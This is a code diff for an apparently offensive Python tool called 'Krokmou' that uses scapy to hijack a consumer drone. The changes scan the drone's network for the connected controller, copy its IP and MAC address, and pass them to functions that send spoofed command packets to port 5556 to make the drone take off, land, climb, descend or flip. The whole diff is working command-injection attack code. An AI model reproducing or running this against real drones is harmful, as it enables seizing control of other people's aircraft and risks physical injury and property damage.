@@ -1,15 +1,15 @@
 from scapy.all import *
 from time import sleep
+from scan_clients import *
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m'
 
-srcIP = "192.168.1.2"
-dstIP = "192.168.1.1"
+# srcIP = "192.168.1.2"
+# srcMAC = "8C:F5:A3:1B:54:97"
+
 srcPort = 5556
 dstPort = 5556
-srcMAC = "8C:F5:A3:1B:54:97"
-dstMAC = "90:03:B7:C8:29:51"
-iface = "wlx000cf60fb452"
-sequenceNumber = 1000000000000000
+dstIP = "192.168.1.1"
+sequenceNumber = 10000000000
 
 def menu():
     print('\n{}Let\'s play with Krokmou : \n'.format(GREEN))
@@ -21,7 +21,7 @@ def menu():
     print('\n\t{}B{} - Back\n'.format(RED,GREEN))
 sleep(0.3)
 
-def take_off():
+def take_off(srcIP, srcMAC, dstMAC, iface):
     global sequenceNumber
     for i in range(20):
         sequenceNumber+=1
@@ -31,7 +31,7 @@ def take_off():
         sendp(spoofed_packet, iface=iface)
         sleep(0.3)
 
-def land():
+def land(srcIP, srcMAC, dstMAC, iface):
     global sequenceNumber
     for i in range(20):
         sequenceNumber+=1
@@ -41,7 +41,16 @@ def land():
         sendp(spoofed_packet, iface=iface)
         sleep(0.3)
 
-def ci_main():
+def ci_main(drone, iface):
+    dstMAC = drone.bssid
+    list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
+    if len(list_of_client) == 1:
+        srcIP = list_of_client[0].ip
+        srcMAC = list_of_client[0].mac
+    else:
+        srcIP = "192.168.1.2"
+        srcMAC = "8C:F5:A3:1B:54:97"
+
     while True:
         menu()
         header = '{}Krokmou > '.format(GREEN,WHITE)
@@ -50,14 +59,14 @@ def ci_main():
         if choice.upper() == 'B' or choice.upper() == 'BACK':
             break
         elif choice == '1':
-            take_off()
+            take_off(srcIP, srcMAC, dstMAC, iface)
         elif choice =='2':
-            land()
+            land(srcIP, srcMAC, dstMAC, iface)
         elif choice == '3':
-            climb()
+            climb(srcIP, srcMAC, dstMAC, iface)
         elif choice == '4':
-            descend()
+            descend(srcIP, srcMAC, dstMAC, iface)
         elif choice == '5':
-            three_six()
+            three_six(srcIP, srcMAC, dstMAC, iface)
         else:
             print('\n{}Grrrr{}: Krokmou doesn\'t understand.\n'.format(RED,GREEN))
